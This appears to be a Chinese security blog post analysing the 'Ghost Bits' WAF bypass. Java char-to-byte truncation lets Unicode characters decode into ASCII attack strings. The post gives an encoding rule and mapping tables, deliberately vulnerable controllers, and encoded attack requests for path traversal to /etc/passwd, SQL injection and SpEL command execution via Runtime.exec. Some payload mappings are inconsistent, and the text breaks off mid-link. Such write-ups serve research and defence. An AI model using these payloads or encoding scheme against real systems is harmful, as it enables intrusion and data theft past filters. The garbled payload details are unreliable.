---
title: Ghost Bits 绕waf原理研究分析
url: https://mp.weixin.qq.com/s/7rOTGcXQCkOoiVUmXGI8sA
source: Doonsec's feed
date: 2026-04-29
fetch_date: 2026-04-30T05:24:37.965407
---

# Ghost Bits 绕waf原理研究分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/4VDMhlcSrqmXL2WhvRhbdYESdiaImaEreK5RImRC8MnLedvPENdiarjD9RiaUqvnWGSkyIshzucDBkibhSFoSOsTMrWSSoeS76cne5z94duohKI/0?wx_fmt=jpeg)

# Ghost Bits 绕waf原理研究分析

原创

Garck3h
Garck3h

pentest

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 免责声明

文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。

## 前言

近期，Black Hat Asia 2026 公布的 "Ghost Bits"（幽灵比特位）漏洞在圈内引发了热议。议题中所讨论的缺陷横跨了 Spring、Tomcat、Fastjson 等主流 Java 组件，可以直接击穿现有的防御体系，导致大量历史漏洞死灰复燃，从而可以实现了“老洞新用”。本文将对其核心原理进行简要的剖析与学习，文末附议题的PPT。

## 1. 原理

### 1.1 Java char 与 byte 的本质差异

Java 的 char 是 **16 位 Unicode**，而 byte 是 **8 位**。当代码使用以下任意方式将 char 强转为 byte 时，高 8 位会被静默丢弃，常见的写法如下：

| 写法 | 等价行为 |
| --- | --- |
| (byte) ch | 只保留低 8 位 |
| baos.write(ch) | write(int) 只写入低 8 位 |
| DataOutputStream.writeBytes(String) | 逐 char 截断为 byte |
| ch & 0xFF | 显式取低 8 位 |

被丢弃的高 8 位数据，就是 "幽灵比特位" (Ghost Bits)。

#### 下面来一个直观演示：一个汉字如何变成一个 ASCII 字符

以 SQL 注入中最关键的字符 **单引号 ' (0x27)**为例，它的幽灵编码是汉字 **逧**(U+9027)：

```
逧 (U+9027) 的 16 位二进制:

     高 8 位 (Ghost Bits)    低 8 位
    ┌─────────────────┐ ┌──────────────┐
    1 0 0 1  0 0 0 0   0 0 1 0  0 1 1 1
    └─────────────────┘ └──────────────┘
         0x90 丢弃 ←       0x27 保留 →  '
```

当执行 (byte) 逧 或 baos.write(逧) 时：

```
char:  1001 0000 0010 0111   (U+9027 = 逧)
            ↓ 高 8 位丢弃
byte:           0010 0111   (0x27 =  ' )
```

WAF 看到的是汉字“逧”，不会触发任何 SQL 注入规则；Java 后端一转 byte，立刻还原成单引号 '，闭合 SQL 语句。

### 1.2 攻击原理

对每个 ASCII 字符 进行ch，加上高位掩码 0x9000，生成幽灵字符 (char)(ch | 0x9000)，低 8 位保持不变：

```
原始 ASCII:    '.'        '/'        'e'        't'
               0x2E       0x2F       0x65       0x74

加上高位掩码:  0x902E     0x902F     0x9065     0x9074
               逮         逯         遥         遴

WAF 视角:      看到汉字 "逮逯遥遴" → 无敏感关键词 → 放行 ✓

后端 char→byte: 0x902E → 0x2E  0x902F → 0x2F  0x9065 → 0x65  0x9074 → 0x74
               '.'         '/'         'e'         't'

还原结果:      "../et..." → 路径穿越 / SQL 注入 / 命令执行 ✓
```

### 1.3 编码规则

```
ASCII → 幽灵编码: ghost = (char)(ch | 0x9000)
幽灵编码 → ASCII: ch = (byte)ghost   (高位丢弃，只保留低 8 位)

逐字符映射表 (常用字符):

路径穿越:
  '.' (0x2E) → 逮 (U+902E)    '/' (0x2F) → 逯 (U+902F)

SQL 注入:
  '\'' (0x27) → 逧 (U+9027)   ' ' (0x20) → 造 (U+9020)
  'O' (0x4F) → 遏 (U+904F)    'R' (0x52) → 遒 (U+9052)
  '=' (0x3D) → 逽 (U+903D)    '-' (0x2D) → 逭 (U+902D)

SpEL 注入:
  'T' (0x54) → 達 (U+9054)    '(' (0x28) → 遨 (U+9028)
  '.' (0x2E) → 逮 (U+902E)    'R' (0x52) → 遒 (U+9052)
  'e' (0x65) → 遥 (U+9065)    'x' (0x78) → 選 (U+9078)
```

## 2. 分析

### 2.1 为什么 WAF 无法检测

| 攻击类型 | WAF 检测规则 | 幽灵编码后 |
| --- | --- | --- |
| 路径穿越 | `\.\./` | `逮逮逯` |
| SQL 注入 | `' OR.*=.*--` | `逧造遏遒造逧週逧逽逧週逧造逭逭` |
| 命令执行 | `Runtime\.exec` | `達逨遪遡遶遡逮遬...` |

WAF 规则基于 ASCII 正则匹配，幽灵编码将每个 ASCII 字符替换为低 8 位相同的 Unicode 字符，WAF 看到的全是汉字/符号，**规则完全不匹配**。

### 2.2 为什么后端会执行

典型 Java 后端代码：

```
ByteArrayOutputStream baos = new ByteArrayOutputStream();
for (int i = 0; i < input.length(); i++) {
    baos.write(input.charAt(i));  // write(int) 只取低 8 位，高位丢弃
}
String decoded = new String(baos.toByteArray(), StandardCharsets.UTF_8); // decoded 还原后的原始攻击语句
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4VDMhlcSrqkw2oXyX88TaGfGgmiacDj40Bbt7BLvaApwUv4p6YyXqh2Y7TTJuXy3ryD5Kc1b1pOTOlaBFcAicBjZXoWpOjbujyM99xo82ER2k/640?wx_fmt=png&from=appmsg)

### 2.3 Tomcat 的限制与绕过

Tomcat 的 `Http InputBuffer.parseRequestLine()`逐字节校验 HTTP 请求行，遇到高位字节 (>= 0x80) 会触发符号扩展 (`byte 0xE9 → int -23`)，导致 `relaxedPathChars`白名单失效（集合存的是正整数 `233`），无法通过配置接受原始 UTF-8 字节。

但是可以识别经过URL编码之后的幽灵字符，另外的方式就是使用下面描述的方式：使用原生 `ServerSocket`+ `InputStreamReader("UTF-8")`在应用层直接读取原始字节流，跳过 Tomcat HTTP 解析器。

## 3. POC 与测试验证

### 3.1 路径穿越 — 任意文件读取

**漏洞代码**(`VulnerableFileController.java`):

```
@GetMapping("/ghost")
public String ghostRead(@RequestParam String payload) throws IOException {
    String fullyDecoded = GhostBitsUtil.decode(payload);
    Path path = Paths.get(BASE_DIR, fullyDecoded).normalize();
    return new String(Files.readAllBytes(path), StandardCharsets.UTF_8);
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/4VDMhlcSrqne5oNtCt2BuEUR98RO5I4dAS7gMeHicYQlRl2mveYr0eaYVZmIU1aAszNvFib7B5wr9uP0vwolEXDqX2Po1pQZzW4c2U7NwDOro/640?wx_fmt=png&from=appmsg)

**幽灵 Payload 构造**(`../../../etc/passwd`):

```
../  → 逮逮逯        ../  → 逮逮逯        ../  → 逮逮逯
etc  → 遥遴遣        /    → 逯
passwd → 遰遡遳遳遷遤
完整 Payload: 逮逮逯逮逮逯逮逮逯遥遴遣逯遰遡遳遳遷遤
```

**攻击请求 :**

```
GET /vulnerable/ghost?payload=/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/阮严灵丰丰甲来/etc/passw%64 HTTP/1.1
Host: 192.168.1.197:8090
```

**验证结果**:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4VDMhlcSrqmjjAkCPFK47dmSFFO7y8BGzx7sEicq14KLFibicTDTE2ficA2hN70WMbtAnUA3NkBG0lc2y8ygicTacqf7vQJ4BPibn37jiakn8cHB08/640?wx_fmt=png&from=appmsg)

**WAF 视角对比**:

```
未编码: ../../../etc/passwd        → WAF 检测到 ../ → 拦截 ✗
幽灵编码: 逮逮逯逮逮逯逮逮逯遥遴遣逯遰遡遳遳遷遤  → WAF 看到汉字 → 放行 ✓
```

### 3.2 SQL 注入

**漏洞代码**(`SqlVulnerableController.java`):

```
@GetMapping("/sql")
    public Map<String, Object> sqlQuery(@RequestParam String username) {
        String decoded = GhostBitsUtil.decode(username);

        String sql = "SELECT id, username, password, email, role FROM users WHERE username = '"
                + decoded + "'";

        List<Map<String, Object>> results;
        String error = null;
        try {
            results = jdbc.queryForList(sql);
        } catch (Exception e) {
            results = Collections.emptyList();
            error = e.getMessage();
        }
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4VDMhlcSrqkll4VlJgzr0zREiakXj1SkNDWKA1fsOWCGREHlZRehc6IYOicBoAStgwNFFv1icmxnXHz7lmnEvQagFibp2Iu1dGtia3Hcu2MTkMJQ/640?wx_fmt=png&from=appmsg)

正常请求

![](https://mmbiz.qpic.cn/mmbiz_png/4VDMhlcSrqmyqaiayMtT0dV1qdDmMFtIhMS4S2fiavTV9SiaXiaEfSiakgYrZxxVdNMdtcyV37khXWOFN6rDq4ZFVUqHSbdQeUZwgwuJRp3GrL9I/640?wx_fmt=png&from=appmsg)

传统注入（`' OR '1'='1' --`）

![](https://mmbiz.qpic.cn/mmbiz_png/4VDMhlcSrqm2Y4ib6FBsE8lZ29XbVqDfzLicD3yTTVCmlIRRXlrFeKnFfLOaLjiaibVUaHiaqW8gZc4ZgNom9YL5bibuSFvGsaBE9IoFncqKSFGaM/640?wx_fmt=png&from=appmsg)

**幽灵 Payload 构造**(`' OR '1'='1' --`):

```
' → 逧  (空格) → 造  O → 遏  R → 遒  (空格) → 造  ' → 逧
1 → 逧  = → 逽  ' → 逧  1 → 逧  ' → 逧  (空格) → 造  - → 逭  - → 逭

完整 Payload: 逧造遏遒造逧週逧逽逧週逧造逭逭
```

**攻击请求**:

```
GET /vulnerable/sql?username=逧造遏遒造逧週逧逽逧週逧造逭逭 HTTP/1.1
Host: 192.168.1.197:8090
```

**验证结果**:

![](https://mmbiz.qpic.cn/mmbiz_png/4VDMhlcSrql5ZMFEVnibYH2Y5eyTcplLPGZ8KqiaaMw5iawvEUwj3LAk8VnAxWjj6xgJavPEE5MOelExibVN9QtEUgMibhtY7HKTopkYs8nxyIIw/640?wx_fmt=png&from=appmsg)

**WAF 视角对比**:

```
未编码: ' OR '1'='1' --             → WAF 检测到 SQL 关键词 → 拦截 ✗
幽灵编码: 逧造遏遒造逧週逧逽逧週逧造逭逭  → WAF 看到汉字 → 放行 ✓
```

### 3.3 SpEL 表达式注入 — RCE

**漏洞代码**(`SpelVulnerableController.java`):

```
 @GetMapping("/spel")
    public Map<String, Object> spelEval(@RequestParam String expr) {
        String decoded = GhostBitsUtil.decode(expr);

        Object result = null;
        String error = null;
        String resultType = null;
        String cmdOutput = null;

        try {
            SpelExpressionParser parser = new SpelExpressionParser();
            StandardEvaluationContext context = new StandardEvaluationContext();
            Expression expression = parser.parseExpression(decoded);
            result = expression.getValue(context);
```

![](https://mmbiz.qpic.cn/mmbiz_png/4VDMhlcSrqk7LCVoFGFGqrr2C8voND6nb8KEvCu6YujcD9dMsYsicpvtzAIWJYxgxJUOLmZQQ9gW7GVUsqFcDXOlUdgib7DsUdyQ7mXaBe0Eg/640?wx_fmt=png&from=appmsg)

传统模板注入:

```
（7*7）
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/4VDMhlcSrqk0pUibjzvjJ5n5qMGicqfZdicX6ltw6FCfxdrCETIYeCEEuiaD9bc8xbVae5HXEG2HPYPEVlbFWUeO9PIaH1Mj1ubH15qLeJPMR6s/640?wx_fmt=png&from=appmsg)

```
T(java.lang.Runtime).getRuntime().exec('id')

![](https://mmbiz.qpic.cn/mmbiz_png/4VDMhlcSrqnvD8ia0N6zlicAn0S7eRUnwI6XLgHPN432acNosMTJ3tD1d3ExLKIrLrRoZrjibk8mT6m7Ix2z3RUoVnB3umrghz0FgHBlj3o81c/640?wx_fmt=png&from=appmsg)
```

**攻击请求**:

```
GET /vulnerable/spel?expr=達逨遪遡遶遡逮遬遡遮遧逮遒遵遮遴適遭遥逩逮遧遥遴遒遵遮遴適遭遥逨逩逮遥選遥遣逨逧適遤逧逩 HTTP/1.1
Host: 192.168.1.197:8090
```

**验证结果**:

![](https://mmbiz.qpic.cn/mmbiz_png/4VDMhlcSrqks59hkSicwYmBcHnOib4GrA8K6JiccuSb7Ru7...